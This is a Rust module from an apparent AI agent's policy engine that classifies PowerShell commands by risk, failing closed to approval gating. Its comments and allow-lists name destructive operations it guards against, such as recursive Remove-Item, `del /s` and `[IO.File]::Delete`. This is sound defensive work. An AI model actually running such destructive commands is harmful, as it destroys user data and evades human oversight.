//! PowerShell-dialect risk classification.
//!
//! On Windows every model command runs under PowerShell — `shell_invocation`
//! in the exec tool picks `pwsh`/`powershell`, never `sh` — but risk
//! classification parsed commands with the POSIX lexer. The two grammars
//! disagree exactly where PowerShell lives: `Select-Object`/`ForEach-Object`
//! pipelines, `if (Test-Path x) { ... }` statements, and
//! `(Get-Location).Path` groupings all tokenized into unknown POSIX heads and
//! classified as mutations, so plan mode and `read_only` denied every
//! exploration command on Windows — a model in plan mode could not even list
//! files. In the other direction, PowerShell-only write syntax (`*> file`,
//! glued `cmd>file`) hid from the POSIX redirect scan entirely.
//!
//! This module is a conservative structural scan, not a PowerShell parser.
//! The recognized read-only core is what models actually emit while
//! exploring: cmdlet pipelines, statement keywords, script blocks over `$_`,
//! pure string/value methods, `> $null` discards. Everything unrecognized
//! fails CLOSED to at least `ShellMutation` — unbalanced delimiters, an
//! unterminated string or here-string, the call operator `&`, dot-sourcing,
//! an unknown method or static type, an unknown command head — so it defers
//! to the deny/approval gate exactly like an unknown POSIX binary does.
//!
//! Script-block-taking cmdlets are safe HERE because every `{ ... }`,
//! `( ... )` and `$( ... )` region is recursively classified with the
//! worst-wins rule. The POSIX classifier must keep treating them as
//! mutations (its lexer never looks inside braces), which is why
//! [`PS_PIPELINE_CMDLETS`] lives in this dialect instead of the shared
//! `PS_READ_ONLY_CMDLETS` table.

use std::path::Path;

use super::super::RiskClass;
use super::classify::{classify_head, shell_max};
use super::destructive::contains_destructive_pattern;
use super::lexer::{basename, read_line};
use crate::policy::plan_gate;

/// Stand-in for an extracted `(...)`/`{...}`/here-string span in the
/// flattened statement text. U+FFFC (object replacement) cannot appear in a
/// real command, so a token beginning with it is unambiguously "the value a
/// region produced" — which makes `(Get-Location).Path` classify as the
/// expression it is instead of an unknown command head.
const REGION_MARK: char = '\u{FFFC}';

/// Recursion cap across nested blocks / subexpressions / here-string
/// interpolations, mirroring the POSIX `MAX_SUBST_DEPTH` fail-safe: at the
/// cap the residue is unprovable, so it floors to a mutation.
const PS_MAX_DEPTH: u8 = 6;

/// Statement keywords — control flow, not commands. Their conditions and
/// bodies arrive as extracted regions and classify on their own; the keyword
/// itself is neutral. `function`/`filter` additionally skip the defined NAME
/// (defining is side-effect-free; the body block is vetted at definition).
const PS_KEYWORDS: &[&str] = &[
    "if", "elseif", "else", "foreach", "for", "while", "do", "switch", "try", "catch", "finally",
    "return", "break", "continue", "param", "begin", "process", "end", "in", "exit", "throw",
    "function", "filter",
];

/// Pipeline-shaping cmdlets (and their aliases) that are read-only ONLY
/// under this dialect, where every script-block / calculated-property
/// argument is recursively classified. `ForEach-Object { Remove-Item $_ }`
/// still refuses — the block classifies on its own and the worst segment
/// wins. `Tee-Object` is deliberately absent (it writes files via
/// `-FilePath`), as is `Out-File`.
const PS_PIPELINE_CMDLETS: &[&str] = &[
    "select-object",
    "select",
    "where-object",
    "where",
    "?",
    "foreach-object",
    "%",
    "sort-object",
    "measure-object",
    "measure",
    "group-object",
    "group",
    "format-table",
    "ft",
    "format-list",
    "fl",
    "format-wide",
    "fw",
    "format-custom",
    "format-hex",
    "out-host",
    "oh",
    "measure-command",
];

/// Methods a read-only expression may invoke: pure string/value transforms
/// over data already in hand. `.Delete()`, `.Kill()`, `.Invoke()`,
/// `.Start()`, `.WriteAllText()` are exactly what this list refuses — an
/// unknown method floors the statement to a mutation. `where`/`foreach`
/// intrinsics are safe because their script-block arguments classify as
/// regions.
const PS_BENIGN_METHODS: &[&str] = &[
    "replace",
    "trim",
    "trimstart",
    "trimend",
    "split",
    "join",
    "substring",
    "tostring",
    "tolower",
    "toupper",
    "tolowerinvariant",
    "toupperinvariant",
    "contains",
    "startswith",
    "endswith",
    "indexof",
    "lastindexof",
    "padleft",
    "padright",
    "insert",
    "remove",
    "normalize",
    "equals",
    "compareto",
    "gettype",
    "getenumerator",
    "where",
    "foreach",
];

/// Static types whose members are pure computation — no filesystem, process,
/// registry, or network reach. `[IO.File]`, `[Environment]`,
/// `[Diagnostics.Process]` and reflection types are deliberately absent and
/// fail closed. (`path` is `[IO.Path]`: string manipulation only.)
const PS_PURE_STATIC_TYPES: &[&str] = &[
    "math",
    "string",
    "char",
    "int",
    "int16",
    "int32",
    "int64",
    "long",
    "double",
    "decimal",
    "single",
    "float",
    "bool",
    "boolean",
    "byte",
    "sbyte",
    "uint",
    "uint16",
    "uint32",
    "uint64",
    "datetime",
    "timespan",
    "datetimeoffset",
    "guid",
    "convert",
    "regex",
    "uri",
    "version",
    "array",
    "enum",
    "encoding",
    "path",
];

/// Classify a command that will run under PowerShell.
///
/// Same contract as `classify_shell_command`: the result feeds
/// `PolicyEngine::decide` unchanged, so `ReadOnly` auto-runs in
/// plan/`read_only` and anything else defers to the gate.
pub(in crate::policy) fn classify_powershell_command(command: &str) -> RiskClass {
    // The raw-text destructive scan is shared with the POSIX dialect on
    // purpose: it already knows the Windows delete spellings (`Remove-Item
    // -Recurse`, `del /s`, `pwsh -Command ...`), and over-matching is the
    // safe direction for a hard deny.
    if contains_destructive_pattern(command) {
        return RiskClass::Destructive;
    }
    ps_pipeline_risk(command, 0)
}

/// Worst risk across the statements of `text`. One walk does both jobs:
/// splitting at top-level separators (`;`, newline, `|`, `&&`, `||`) and
/// extracting the nested executable regions PowerShell hides in `(...)`,
/// `{...}`, `$(...)`, `@(...)`, `@{...}` and expanding here-strings — each
/// recursively classified, worst wins. A statement reaches
/// [`ps_flat_statement_risk`] flat: regions replaced by [`REGION_MARK`], so
/// token-level reasoning cannot be fooled by structure it did not see.
fn ps_pipeline_risk(text: &str, depth: u8) -> RiskClass {
    if depth > PS_MAX_DEPTH {
        return RiskClass::ShellMutation;
    }
    let chars: Vec<char> = text.chars().collect();
    let mut worst = RiskClass::ReadOnly;
    let mut stmt = String::new();
    let mut i = 0usize;
    while i < chars.len() {
        let c = chars[i];
        match c {
            // Backtick is PowerShell's ESCAPE character (never command
            // substitution): keep the escaped char literal.
            '`' => {
                stmt.push(c);
                if let Some(&n) = chars.get(i + 1) {
                    stmt.push(n);
                    i += 1;
                }
                i += 1;
            },
            '@' if here_string_opens(&chars, i) => {
                // Unterminated: the rest of the command is string data in
                // real PowerShell, so nothing after it is provable.
                let Some((risk, end)) = here_string_risk(&chars, i, depth) else {
                    return RiskClass::ShellMutation;
                };
                worst = shell_max(worst, risk);
                stmt.push(REGION_MARK);
                i = end;
            },
            '\'' | '"' => {
                let Some(end) = skip_string(&chars, i, c) else {
                    return RiskClass::ShellMutation;
                };
                stmt.extend(chars[i..end].iter());
                i = end;
            },
            '<' if chars.get(i + 1) == Some(&'#') => {
                i = skip_block_comment(&chars, i);
                stmt.push(' ');
            },
            '#' if stmt.chars().last().is_none_or(char::is_whitespace) => {
                while i < chars.len() && chars[i] != '\n' {
                    i += 1;
                }
            },
            '(' | '{' => {
                let Some((risk, end)) = region_risk(&chars, i, c, &stmt, depth) else {
                    return RiskClass::ShellMutation;
                };
                worst = shell_max(worst, risk);
                stmt.push(REGION_MARK);
                i = end;
            },
            // A closer with no opener: structurally broken, unprovable.
            ')' | '}' => return RiskClass::ShellMutation,
            ';' | '\n' => {
                worst = shell_max(worst, flush_statement(&mut stmt, depth));
                i += 1;
            },
            '|' => {
                worst = shell_max(worst, flush_statement(&mut stmt, depth));
                i += 1;
                if chars.get(i) == Some(&'|') {
                    i += 1;
                }
            },
            '&' if chars.get(i + 1) == Some(&'&') => {
                worst = shell_max(worst, flush_statement(&mut stmt, depth));
                i += 2;
            },
            // A lone `&` (call operator / background job) stays in the
            // statement text and poisons it in the token scan.
            _ => {
                stmt.push(c);
                i += 1;
            },
        }
    }
    shell_max(worst, flush_statement(&mut stmt, depth))
}

/// Classify and clear the accumulated statement text.
fn flush_statement(stmt: &mut String, depth: u8) -> RiskClass {
    let risk = if stmt.trim().is_empty() {
        RiskClass::ReadOnly
    } else {
        ps_flat_statement_risk(stmt.trim(), depth)
    };
    stmt.clear();
    risk
}

/// Risk of the here-string opening at `chars[i]`, plus the index past its
/// terminator. Literal (`@'`) bodies are data; expanding (`@"`) bodies
/// execute their `$(...)` interpolations, exactly like an unquoted POSIX
/// heredoc, so those classify recursively. `None` when unterminated.
fn here_string_risk(chars: &[char], i: usize, depth: u8) -> Option<(RiskClass, usize)> {
    let quote = chars[i + 1];
    let (body, end) = scan_here_string(chars, i, quote)?;
    let mut risk = RiskClass::ReadOnly;
    if quote == '"' {
        for sub in dollar_subexpressions(&body) {
            risk = shell_max(risk, ps_pipeline_risk(&sub, depth + 1));
        }
    }
    Some((risk, end))
}

/// Risk of the `(...)`/`{...}` region opening at `chars[i]`, plus the index
/// past its closer. The content classifies recursively; additionally, a `(`
/// glued to `.Name` is a method INVOCATION — anything outside the audited
/// pure set floors to a mutation. `None` when unbalanced.
fn region_risk(
    chars: &[char],
    i: usize,
    opener: char,
    stmt: &str,
    depth: u8,
) -> Option<(RiskClass, usize)> {
    let closer = if opener == '(' { ')' } else { '}' };
    let close = find_matching(chars, i, opener, closer)?;
    let inner: String = chars[i + 1..close].iter().collect();
    let mut risk = ps_pipeline_risk(&inner, depth + 1);
    if opener == '('
        && let Some(method) = method_name_before(stmt)
        && !PS_BENIGN_METHODS.contains(&method.to_ascii_lowercase().as_str())
    {
        risk = shell_max(risk, RiskClass::ShellMutation);
    }
    Some((risk, close + 1))
}

/// One flat statement (separators split, regions replaced by
/// [`REGION_MARK`]). Assignments classify as their right-hand pipeline; the
/// token scans catch redirects, the call operator, and static member access
/// anywhere in the statement; the head walk decides command vs expression.
fn ps_flat_statement_risk(stmt: &str, depth: u8) -> RiskClass {
    if let Some(rhs) = split_assignment(stmt) {
        // `$x = <pipeline>` / `$env:FOO = ...` / a hashtable's `key = value`
        // line: the binding itself is session-local state; the risk is
        // whatever the RHS does.
        let rhs = rhs.trim().to_string();
        if rhs.is_empty() {
            return RiskClass::ReadOnly;
        }
        return ps_flat_statement_risk(&rhs, depth);
    }
    let tokens = ps_tokens(stmt);
    let mut worst = RiskClass::ReadOnly;
    for (i, tok) in tokens.iter().enumerate() {
        if tok.quoted && tok.text.find('>').is_none() {
            continue;
        }
        let t = tok.text.as_str();
        // `--%` stops PowerShell's parsing: the remainder is verbatim argv
        // for a native command, so shell constructs after it are inert.
        if !tok.quoted && t == "--%" {
            break;
        }
        // Call operator (`& cmd`, `& $var`) or background job: invokes
        // something no table vetted.
        if !tok.quoted && t.starts_with('&') {
            worst = shell_max(worst, RiskClass::ShellMutation);
        }
        // `[Type]::Member` — pure value types only; `[IO.File]::Delete`
        // fails closed.
        if !tok.quoted && t.contains("::") && !static_access_is_pure(t) {
            worst = shell_max(worst, RiskClass::ShellMutation);
        }
        // An unquoted `>` is the redirect operator wherever it appears in
        // the token (`> f`, `2>>f`, `*>f`, glued `hi>f`). Only an unquoted
        // `$null` target discards; a quoted "$null" is a literal file name.
        if let Some(target) = ps_redirect_in_raw(&tok.raw) {
            let discards = match target {
                RedirectTarget::Merge => true,
                RedirectTarget::Glued(text, quoted) => {
                    !quoted && text.eq_ignore_ascii_case("$null")
                },
                RedirectTarget::NextToken => tokens
                    .get(i + 1)
                    .is_some_and(|n| !n.quoted && n.text.eq_ignore_ascii_case("$null")),
            };
            if !discards {
                worst = shell_max(worst, RiskClass::ShellMutation);
            }
        }
    }
    shell_max(worst, ps_head_risk(&tokens, depth))
}

/// Decide the statement's own shape: keyword-led, expression, or a command
/// whose head goes through the shared [`classify_head`] tables.
fn ps_head_risk(tokens: &[PsToken], depth: u8) -> RiskClass {
    let mut idx = 0;
    let mut skip_name = false;
    while idx < tokens.len() {
        let tok = &tokens[idx];
        if tok.quoted {
            // A quoted head is a string expression — only the call operator
            // runs it, and that already poisoned the statement.
            return RiskClass::ReadOnly;
        }
        if skip_name {
            skip_name = false;
            idx += 1;
            continue;
        }
        let t = tok.text.as_str();
        let lower = t.to_ascii_lowercase();
        if PS_KEYWORDS.contains(&lower.as_str()) {
            skip_name = matches!(lower.as_str(), "function" | "filter");
            idx += 1;
            continue;
        }
        // Flattened `foreach` header: in `$f in <pipeline>` the pipeline
        // after `in` really executes — classify it as a statement of its own
        // instead of hiding it behind the `$f` expression head.
        if t.starts_with('$')
            && tokens
                .get(idx + 1)
                .is_some_and(|n| !n.quoted && n.text.eq_ignore_ascii_case("in"))
        {
            let tail = tokens[idx + 2..]
                .iter()
                .map(|t| t.raw.as_str())
                .collect::<Vec<_>>()
                .join(" ");
            if tail.trim().is_empty() {
                return RiskClass::ReadOnly;
            }
            return ps_flat_statement_risk(&tail, depth);
        }
        if t == "." {
            // Dot-sourcing runs an arbitrary script in the session scope.
            return RiskClass::ShellMutation;
        }
        if is_expression_start(t) {
            // Pure expression statement: property access, operators,
            // literals, ranges. Method calls and static members were vetted
            // already; nothing left here can invoke a command.
            return RiskClass::ReadOnly;
        }
        let head = basename(&lower);
        let head = head.strip_suffix(".exe").unwrap_or(head);
        if PS_PIPELINE_CMDLETS.contains(&head) {
            return RiskClass::ReadOnly;
        }
        let seg: Vec<String> = tokens[idx..].iter().map(|t| t.text.clone()).collect();
        return classify_head(head, &seg);
    }
    RiskClass::ReadOnly
}

/// True when the statement's first token is a value, not a command:
/// variables, literals, casts, unary operators, or the result of an
/// extracted region (`(Get-Location).Path`).
fn is_expression_start(t: &str) -> bool {
    t.chars().next().is_some_and(|c| {
        c == REGION_MARK || matches!(c, '$' | '@' | '[' | '-' | '+' | '!') || c.is_ascii_digit()
    })
}

/// One token of a flat statement.
struct PsToken {
    /// Text as it appeared, quotes and escapes included — used to rejoin a
    /// tail for re-classification and to find unquoted redirect operators.
    raw: String,
    /// Quote-stripped text for table lookups and target comparison.
    text: String,
    /// Whether any part was quoted. A fully data token never carries an
    /// operator.
    quoted: bool,
}

/// Whitespace-split `stmt` into tokens, honoring PowerShell quoting: single
/// quotes are literal (with `''` doubling), double quotes take backtick
/// escapes and `""` doubling, and a backtick outside quotes escapes the next
/// character (including whitespace — the token continues).
fn ps_tokens(stmt: &str) -> Vec<PsToken> {
    let chars: Vec<char> = stmt.chars().collect();
    let mut out = Vec::new();
    let mut raw = String::new();
    let mut text = String::new();
    let mut quoted = false;
    let mut i = 0;
    while i < chars.len() {
        let c = chars[i];
        if c.is_whitespace() {
            push_token(&mut out, &mut raw, &mut text, &mut quoted);
            i += 1;
            continue;
        }
        match c {
            '`' => {
                raw.push(c);
                if let Some(&n) = chars.get(i + 1) {
                    raw.push(n);
                    text.push(n);
                    i += 1;
                }
                i += 1;
            },
            '\'' | '"' => {
                quoted = true;
                raw.push(c);
                let mut j = i + 1;
                while j < chars.len() {
                    let d = chars[j];
                    raw.push(d);
                    if d == '`' && c == '"' {
                        if let Some(&n) = chars.get(j + 1) {
                            raw.push(n);
                            text.push(n);
                            j += 1;
                        }
                        j += 1;
                        continue;
                    }
                    if d == c {
                        if chars.get(j + 1) == Some(&c) {
                            raw.push(c);
                            text.push(c);
                            j += 2;
                            continue;
                        }
                        j += 1;
                        break;
                    }
                    text.push(d);
                    j += 1;
                }
                i = j;
            },
            _ => {
                raw.push(c);
                text.push(c);
                i += 1;
            },
        }
    }
    push_token(&mut out, &mut raw, &mut text, &mut quoted);
    out
}

fn push_token(out: &mut Vec<PsToken>, raw: &mut String, text: &mut String, quoted: &mut bool) {
    if !raw.is_empty() {
        out.push(PsToken {
            raw: std::mem::take(raw),
            text: std::mem::take(text),
            quoted: *quoted,
        });
    }
    *quoted = false;
}

/// What an in-token redirect writes to.
enum RedirectTarget {
    /// `2>&1` and friends — a stream merge, no file involved.
    Merge,
    /// Target glued to the operator (`>file`, `2>>$null`), with whether it
    /// was quoted.
    Glued(String, bool),
    /// Operator ends the token; the target is the next token.
    NextToken,
}

/// Find the first unquoted `>` in `raw` and resolve what it writes to.
/// `None` when the token has no unquoted redirect.
fn ps_redirect_in_raw(raw: &str) -> Option<RedirectTarget> {
    let chars: Vec<char> = raw.chars().collect();
    let mut i = 0;
    while i < chars.len() {
        match chars[i] {
            '`' => i += 2,
            c @ ('\'' | '"') => {
                i = skip_string(&chars, i, c).unwrap_or(chars.len());
            },
            '>' => {
                let mut j = i + 1;
                if chars.get(j) == Some(&'>') {
                    j += 1;
                }
                if chars.get(j) == Some(&'&') {
                    return Some(RedirectTarget::Merge);
                }
                if j >= chars.len() {
                    return Some(RedirectTarget::NextToken);
                }
                let rest: String = chars[j..].iter().collect();
                let quoted = rest.starts_with('\'') || rest.starts_with('"');
                let stripped = rest.trim_matches(['\'', '"']).to_string();
                return Some(RedirectTarget::Glued(stripped, quoted));
            },
            _ => i += 1,
        }
    }
    None
}

/// Split `stmt` at a top-level assignment operator, returning the RHS. The
/// LHS of a PowerShell assignment — `$var`, `$env:NAME`, a property on a
/// live object, a hashtable key — is session-local state, so the statement's
/// risk is whatever the RHS pipeline does. `==`/`!=`/`<=`/`>=` shapes (not
/// PowerShell, but models type them) are comparisons and do not split.
fn split_assignment(stmt: &str) -> Option<String> {
    let chars: Vec<char> = stmt.chars().collect();
    let mut i = 0;
    while i < chars.len() {
        match chars[i] {
            '`' => i += 2,
            c @ ('\'' | '"') => i = skip_string(&chars, i, c)?,
            '=' => {
                if chars.get(i + 1) == Some(&'=') {
                    i += 2;
                    continue;
                }
                if i > 0 && matches!(chars[i - 1], '!' | '<' | '>') {
                    i += 1;
                    continue;
                }
                // `+=` etc. still assign; the operator char is not LHS text.
                let lhs_end = if i > 0 && matches!(chars[i - 1], '+' | '-' | '*' | '/' | '%') {
                    i - 1
                } else {
                    i
                };
                let lhs: String = chars[..lhs_end].iter().collect();
                let lhs = lhs.trim();
                let plain_key = !lhs.is_empty()
                    && lhs
                        .chars()
                        .all(|c| c.is_alphanumeric() || matches!(c, '_' | '.' | ':'));
                let ok = lhs.starts_with('$')
                    || lhs.starts_with(REGION_MARK)
                    || lhs.starts_with('\'')
                    || lhs.starts_with('"')
                    || plain_key;
                if !ok {
                    return None;
                }
                return Some(chars[i + 1..].iter().collect());
            },
            _ => i += 1,
        }
    }
    None
}

/// `[Type]::Member` static access — pure only for the audited value types.
/// Anything else (`[IO.File]::Delete`, `[Diagnostics.Process]::Start`,
/// reflection, a `$var::member`) fails closed.
fn static_access_is_pure(token: &str) -> bool {
    let lower = token.to_ascii_lowercase();
    let Some(rest) = lower.strip_prefix('[') else {
        return false;
    };
    let Some((ty, after)) = rest.split_once(']') else {
        return false;
    };
    if !after.starts_with("::") {
        return false;
    }
    let ty = ty.strip_prefix("system.").unwrap_or(ty);
    let ty = ty.rsplit('.').next().unwrap_or(ty);
    PS_PURE_STATIC_TYPES.contains(&ty)
}

/// The method name when the statement text so far ends `....name` — i.e. the
/// `(` about to be scanned is a method INVOCATION, not a grouping.
/// PowerShell only reads `x.Name(...)` as a call when the `(` is glued to
/// the name, so a space between keeps it a grouping (whose content is
/// classified as a command — the safe direction).
fn method_name_before(stmt: &str) -> Option<String> {
    let mut rev = stmt.chars().rev().peekable();
    let mut name = String::new();
    while let Some(&c) = rev.peek() {
        if c.is_ascii_alphanumeric() || c == '_' {
            name.push(c);
            rev.next();
        } else {
            break;
        }
    }
    if name.is_empty() || rev.peek() != Some(&'.') {
        return None;
    }
    Some(name.chars().rev().collect())
}

/// Index just past the closing quote of the string starting at `chars[i]`
/// (`'` or `"`), honoring the dialect's escapes: backtick escapes inside
/// double quotes, and a doubled quote embeds a literal quote in both kinds.
/// `None` when the string never closes.
fn skip_string(chars: &[char], i: usize, quote: char) -> Option<usize> {
    let mut j = i + 1;
    while j < chars.len() {
        let c = chars[j];
        if c == '`' && quote == '"' {
            j += 2;
            continue;
        }
        if c == quote {
            if chars.get(j + 1) == Some(&quote) {
                j += 2;
                continue;
            }
            return Some(j + 1);
        }
        j += 1;
    }
    None
}

/// True when `chars[i..]` opens a here-string: `@'` or `@"` with nothing but
/// whitespace before the end of the line. (Real PowerShell requires the
/// newline immediately; tolerating stray spaces only widens what counts as
/// literal data, and a malformed opener is a parse error at run time.)
fn here_string_opens(chars: &[char], i: usize) -> bool {
    if chars.get(i) != Some(&'@') {
        return false;
    }
    let Some(&q) = chars.get(i + 1) else {
        return false;
    };
    if q != '\'' && q != '"' {
        return false;
    }
    chars[i + 2..]
        .iter()
        .take_while(|c| **c != '\n')
        .all(|c| c.is_whitespace())
}

/// Scan the here-string opening at `chars[i]`; returns the body text and the
/// index just past the `'@`/`"@` terminator. The terminator must begin a
/// line (leading whitespace tolerated — terminating EARLY only turns
/// would-be string data back into scanned code, the safe direction). `None`
/// when no terminator exists.
fn scan_here_string(chars: &[char], i: usize, quote: char) -> Option<(String, usize)> {
    let mut j = i + 2;
    while j < chars.len() && chars[j] != '\n' {
        j += 1;
    }
    if j >= chars.len() {
        return None;
    }
    j += 1;
    let mut body = String::new();
    while j < chars.len() {
        let (line, next) = read_line(chars, j);
        let trimmed = line.trim_start();
        let mut it = trimmed.chars();
        if it.next() == Some(quote) && it.next() == Some('@') {
            let offset = line.chars().count() - trimmed.chars().count();
            return Some((body, j + offset + 2));
        }
        body.push_str(&line);
        body.push('\n');
        j = next;
    }
    None
}

/// Skip a `<# ... #>` block comment; an unterminated one runs to EOF (it is
/// data either way).
fn skip_block_comment(chars: &[char], i: usize) -> usize {
    let mut j = i + 2;
    while j < chars.len() {
        if chars[j] == '#' && chars.get(j + 1) == Some(&'>') {
            return j + 2;
        }
        j += 1;
    }
    chars.len()
}

/// Index of the closer matching `chars[open]`, skipping strings,
/// here-strings, comments and backtick escapes. `None` when unbalanced or
/// when a nested string never terminates — the caller fails closed.
fn find_matching(chars: &[char], open: usize, opener: char, closer: char) -> Option<usize> {
    let mut depth = 1u32;
    let mut j = open + 1;
    while j < chars.len() {
        let c = chars[j];
        if c == '`' {
            j += 2;
            continue;
        }
        if here_string_opens(chars, j) {
            let quote = chars[j + 1];
            let (_, end) = scan_here_string(chars, j, quote)?;
            j = end;
            continue;
        }
        if c == '\'' || c == '"' {
            j = skip_string(chars, j, c)?;
            continue;
        }
        if c == '<' && chars.get(j + 1) == Some(&'#') {
            j = skip_block_comment(chars, j);
            continue;
        }
        if c == '#' && chars[j - 1].is_whitespace() {
            while j < chars.len() && chars[j] != '\n' {
                j += 1;
            }
            continue;
        }
        if c == opener {
            depth += 1;
        } else if c == closer {
            depth -= 1;
            if depth == 0 {
                return Some(j);
            }
        }
        j += 1;
    }
    None
}

/// Inner text of every `$(...)` in an expanding here-string body.
/// Quote-blind (the body has no code-level quoting context) but
/// escape-aware: `` `$ `` genuinely suppresses interpolation.
fn dollar_subexpressions(body: &str) -> Vec<String> {
    let chars: Vec<char> = body.chars().collect();
    let mut out = Vec::new();
    let mut i = 0;
    while i < chars.len() {
        match chars[i] {
            '`' => i += 2,
            '$' if chars.get(i + 1) == Some(&'(') => {
                let mut depth = 1u32;
                let mut j = i + 2;
                while j < chars.len() {
                    match chars[j] {
                        '(' => depth += 1,
                        ')' => {
                            depth -= 1;
                            if depth == 0 {
                                break;
                            }
                        },
                        _ => {},
                    }
                    j += 1;
                }
                out.push(chars[i + 2..j.min(chars.len())].iter().collect());
                i = j + 1;
            },
            _ => i += 1,
        }
    }
    out
}

/// Split `text` into flat statements with NO nested structure: any
/// `(`/`{` region, here-string, unterminated string, or stray closer
/// refuses (`None`).
///
/// The plan-mode carve-outs build on this the way their POSIX twins refuse
/// substitutions and heredocs — a region could hide arbitrary execution,
/// and the carve-outs must stay anchored. Quoted parens are fine: plan
/// prose legitimately quotes code.
fn flat_statements(text: &str) -> Option<Vec<String>> {
    let chars: Vec<char> = text.chars().collect();
    let mut out = Vec::new();
    let mut stmt = String::new();
    let mut i = 0usize;
    let flush = |stmt: &mut String, out: &mut Vec<String>| {
        let s = stmt.trim();
        if !s.is_empty() {
            out.push(s.to_string());
        }
        stmt.clear();
    };
    while i < chars.len() {
        let c = chars[i];
        match c {
            '`' => {
                stmt.push(c);
                if let Some(&n) = chars.get(i + 1) {
                    stmt.push(n);
                    i += 1;
                }
                i += 1;
            },
            '@' if here_string_opens(&chars, i) => return None,
            '\'' | '"' => {
                let end = skip_string(&chars, i, c)?;
                stmt.extend(chars[i..end].iter());
                i = end;
            },
            '<' if chars.get(i + 1) == Some(&'#') => {
                i = skip_block_comment(&chars, i);
                stmt.push(' ');
            },
            '#' if stmt.chars().last().is_none_or(char::is_whitespace) => {
                while i < chars.len() && chars[i] != '\n' {
                    i += 1;
                }
            },
            '(' | '{' | ')' | '}' => return None,
            ';' | '\n' => {
                flush(&mut stmt, &mut out);
                i += 1;
            },
            '|' => {
                flush(&mut stmt, &mut out);
                i += 1;
                if chars.get(i) == Some(&'|') {
                    i += 1;
                }
            },
            '&' if chars.get(i + 1) == Some(&'&') => {
                flush(&mut stmt, &mut out);
                i += 2;
            },
            _ => {
                stmt.push(c);
                i += 1;
            },
        }
    }
    flush(&mut stmt, &mut out);
    Some(out)
}

/// Tokens that end a carve-out's ability to reason: the call operator,
/// static member access, PowerShell's stop-parsing token, and the writers
/// whose targets ride in argv instead of a redirect.
fn has_carve_out_poison(tokens: &[PsToken]) -> bool {
    tokens.iter().any(|t| {
        if t.quoted {
            return false;
        }
        let lower = t.text.to_ascii_lowercase();
        let head = basename(&lower);
        t.text.starts_with('&')
            || t.text.contains("::")
            || t.text == "--%"
            || matches!(head, "tee" | "tee-object" | "dd" | "out-file")
    })
}

/// A cwd move (`cd`/`Set-Location`/…) relocates what a workdir-relative
/// redirect target means, so the plan-file carve-out's LEXICAL path match
/// must refuse it. The safe-build carve-out deliberately does not care —
/// `cd crates/foo; cargo test` matches no paths.
fn has_cwd_change(tokens: &[PsToken]) -> bool {
    tokens.iter().any(|t| {
        if t.quoted {
            return false;
        }
        let lower = t.text.to_ascii_lowercase();
        let head = basename(&lower);
        plan_gate::CWD_CHANGING_BUILTINS.contains(&head)
    })
}

/// PowerShell spelling of `is_plan_safe_build_command`: every statement is
/// read-only, or a known build tool running a known build/test subcommand,
/// with no file-writing redirect anywhere (`> $null` and stream merges stay
/// fine). Anchored exactly like the POSIX twin: regions, here-strings, the
/// call operator, and argv-target writers all refuse outright.
pub(in crate::policy) fn is_plan_safe_build_command_ps(command: &str) -> bool {
    let Some(stmts) = flat_statements(command) else {
        return false;
    };
    if stmts.is_empty() {
        return false;
    }
    stmts.iter().all(|stmt| {
        let tokens = ps_tokens(stmt);
        if has_carve_out_poison(&tokens) {
            return false;
        }
        let writes_file = tokens.iter().any(|t| {
            matches!(
                ps_redirect_in_raw(&t.raw),
                Some(RedirectTarget::NextToken | RedirectTarget::Glued(..))
            ) && !redirect_discards(&tokens, t)
        });
        if writes_file {
            return false;
        }
        let risk = ps_head_risk(&tokens, 0);
        if risk == RiskClass::ReadOnly {
            return true;
        }
        // Only a Process head can still qualify, and only as a known build
        // verb; every other class (mutation, network, system) refuses.
        if risk != RiskClass::Process {
            return false;
        }
        let texts: Vec<String> = tokens.iter().map(|t| t.text.clone()).collect();
        plan_gate::segment_is_safe_build(&texts)
    })
}

/// Does the redirect carried by `tok` discard (unquoted `$null` target,
/// glued or as the following token)?
fn redirect_discards(tokens: &[PsToken], tok: &PsToken) -> bool {
    match ps_redirect_in_raw(&tok.raw) {
        Some(RedirectTarget::Glued(target, quoted)) => {
            !quoted && target.eq_ignore_ascii_case("$null")
        },
        Some(RedirectTarget::NextToken) => {
            let idx = tokens
                .iter()
                .position(|t| std::ptr::eq(t, tok))
                .unwrap_or(usize::MAX);
            tokens
                .get(idx.wrapping_add(1))
                .is_some_and(|n| !n.quoted && n.text.eq_ignore_ascii_case("$null"))
        },
        Some(RedirectTarget::Merge) | None => false,
    }
}

/// PowerShell spelling of `is_plan_file_only_write`: every statement is
/// read-only once its plan-file redirects are set aside, and at least one
/// redirect actually targets the plan file. This is what makes the plan
/// denial's promise — "a shell redirect writing ONLY that file also works" —
/// true on Windows, including backslash path spellings the POSIX tokenizer
/// mangles. Redirect operators must stand alone or carry only a
/// digit/`*` stream prefix (`>`, `>>`, `2>`, `*>>`); a word-glued operator
/// (`hi>plan.md`) refuses rather than being reconstructed.
pub(in crate::policy) fn is_plan_file_only_write_ps(
    command: &str,
    workdir: &Path,
    plan_file: &Path,
) -> bool {
    let Some(stmts) = flat_statements(command) else {
        return false;
    };
    let mut saw_plan_redirect = false;
    for stmt in &stmts {
        let tokens = ps_tokens(stmt);
        if has_carve_out_poison(&tokens) || has_cwd_change(&tokens) {
            return false;
        }
        let mut kept: Vec<String> = Vec::with_capacity(tokens.len());
        let mut skip_next = false;
        for (i, tok) in tokens.iter().enumerate() {
            if skip_next {
                skip_next = false;
                continue;
            }
            let Some(target) = ps_redirect_in_raw(&tok.raw) else {
                kept.push(tok.raw.clone());
                continue;
            };
            // Only a pure operator token (optional digit/`*` prefix) is
            // reasoned about; `hi>file` keeps content and operator fused.
            let prefix: String = tok.raw.chars().take_while(|c| *c != '>').collect();
            if !(prefix.is_empty() || prefix == "*" || prefix.chars().all(|c| c.is_ascii_digit())) {
                return false;
            }
            let target_text = match target {
                RedirectTarget::Merge => {
                    kept.push(tok.raw.clone());
                    continue;
                },
                RedirectTarget::Glued(text, _) => text,
                RedirectTarget::NextToken => match tokens.get(i + 1) {
                    Some(n) => {
                        skip_next = true;
                        n.text.clone()
                    },
                    None => return false,
                },
            };
            if target_text.eq_ignore_ascii_case("$null") {
                continue;
            }
            if plan_gate::is_plan_file_path(workdir, &target_text, plan_file) {
                saw_plan_redirect = true;
                continue;
            }
            return false;
        }
        let residue = kept.join(" ");
        if !residue.trim().is_empty()
            && ps_flat_statement_risk(residue.trim(), 0) != RiskClass::ReadOnly
        {
            return false;
        }
    }
    saw_plan_redirect
}

#[cfg(test)]
mod tests {
    use super::*;

    fn classify(cmd: &str) -> RiskClass {
        classify_powershell_command(cmd)
    }

